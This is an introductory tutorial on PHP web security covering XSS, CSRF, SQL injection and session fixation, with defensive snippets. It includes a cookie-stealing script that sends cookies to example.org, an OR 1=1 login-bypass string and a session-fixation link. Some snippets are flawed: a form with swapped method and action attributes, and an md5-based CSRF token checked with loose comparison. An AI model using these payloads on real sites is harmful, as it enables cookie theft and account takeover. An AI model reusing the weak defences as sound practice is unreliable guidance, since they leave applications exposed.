## Website Security

####Spoofed Forms
A common method used by attackers is a spoofed form submission by copying a target form and executing it from a different location. Do not rely upon client-side
validation techniques. Filtering input ensures that all data conforms to a list of acceptable values, and spoofed forms will not be able to get around serverside
filtering rules.

####Cross-Site Scripting
Cross-site scripting (XSS) is one of the most common and best known kinds of attacks. It is usually an effort to steal user information, such as cookies and other personally identifiable data. All applications that display input are at risk. Consider the following form, for example. It allows a user to add a comment to another user’s profile. After submitting a comment, the page displays all of the comments that have been submitted so that everyone can view all of the comments left on the user’s profile.
```php
<form method="POST" action="process.php">
  <p>Add a comment:</p>
  <p><textarea name="comment"></textarea></p>
  <p><input type="submit"></p>
</form>
```
Imagine that a malicious user submits a comment on someone’s profile that includes the following content and it is displayed without escaping:
```
<script>
document.location = 'http://example.org/getcookies.php?cookies=' + document.cookie;
</script>
```
Now, everyone visiting this user’s profile will be redirected to the given URL and their cookies (including personally identifiable information and login information) will be appended to the query string. The attacker can easily access the cookies with ```$_GET['cookies']``` and store them for later use. However, this attack works only if the application fails to escape output. Thus,
it is easy to prevent with proper output escaping.


####Cross-Site Request Forgeries
A cross-site request forgery (CSRF) is an attack that attempts to cause a victim to send arbitrary HTTP requests, usually to URLs requiring privileged access, using the victim’s existing session to gain access. The HTTP request then causes the victim to execute a particular action based on his or her level of privilege, such as making a purchase or modifying or removing information.

While proper escaping of output will prevent your application from being used as the vehicle for a CSRF attack, it will not prevent your application from receiving forged requests. Thus, your application must be able to determine whether the request was intentional
and legitimate or possibly forged and malicious.

Setting a token to prevent CSRF:
```php
session_start();
$token = md5(uniqid(rand(), TRUE));
$_SESSION['token'] = $token;
?>
<form action="checkout.php" method="POST">
  <input type="hidden" name="token" value="<?php echo $token; ?>">
  <!-- Remainder of form -->
</form>
```
Validating CSRF token:
```php
// ensure token is set and that the value submitted
// by the client matches the value in the user's session
if (isset($_SESSION['token']) && isset($_POST['token']) && $_POST['token'] == $_SESSION['token']) {
  // Token is valid, continue processing form data
}
```

####Database Security
SQL injection occurs when a malicious user experiments on a form or (worse) URL query string to gain information about a database. After gaining sufficient knowledge—usually from database error messages—the attacker can exploit any possible vulnerabilities in the form by injecting SQL into form fields. Example form:
```html
<form method="login.php" action="POST">
  Username: <input type="text" name="username" /><br />
  Password: <input type="password" name="password" /><br />
  <input type="submit" value="Log In" />
</form>
```
Login script:
```php
$username = $_POST['username'];
$password = password_hash($_POST['password'], PASSWORD_DEFAULT);
$sql = "SELECT * FROM users WHERE username = '{$username}' AND password = '{$password}'";
/* database connection and query code */
if (count($results) > 0) {
  // Successful login attempt
}
```
An attacker might attempt to log in using a username similar to the following:
```
username' OR 1 = 1 --
```
With this username and a blank password, the SQL statement is now:
```sql
SELECT * FROM users WHERE username = 'username' OR 1 = 1 
  --' AND password = '431971ugwedq328r83ytges.98'
```
Since 1 = 1 is always true and -- begins an SQL comment, the SQL query ignores everything after the -- and successfully returns all user records. SQL injection attacks are made possible by a lack of filtering and escaping.

####Session Security
Two popular forms of session attacks are session fixation and session hijacking. Whereas most of the other attacks described in this chapter can be prevented by filtering input and escaping output, session attacks cannot. Instead, it is necessary to plan for them and identify potential problem areas of your application. It is possible, however, to set the session identifier manually through the
query string, forcing the use of a particular session. This simple attack is called session fixation because the attacker fixes the session. This is most commonly achieved by creating a link to your application and appending the session identifier that the attacker wishes to give any user clicking the link.
```
<a href="http://example.org/index.php?PHPSESSID=1234">Click here</a>
```
When the user accesses your site through this session, he may provide sensitive information or even login credentials. If the user logs in while using the provided session identifier, the attacker may be able to “ride” on the same session and gain access to the user’s account.

Every time a user’s access level changes, the session identifier should be regenerated. PHP makes this a simple task with
```session_regenerate_id()``` .
```php
session_start();
// If the user login is successful, regenerate the session ID
if (authenticate()) {
  session_regenerate_id();
}
```
While this will protect users from having their session fixed and offering easy
access to any would-be attacker, it won’t help much against another common
session attack known as session hijacking. This is a generic term used to
describe any means by which an attacker gains a user’s valid session identifier
(rather than providing one of his own).

After a successful login attempt, store the User-Agent into the session:
```php
$_SESSION['user_agent'] = $_SERVER['HTTP_USER_AGENT'];
```
Then, on subsequent page loads, check to ensure that the User-Agent has not
changed. If it has changed, that is cause for concern, and the user should log in again.
```
if ($_SESSION['user_agent'] != $_SERVER['HTTP_USER_AGENT']) {
  // Force user to log in again
  exit;
}
```
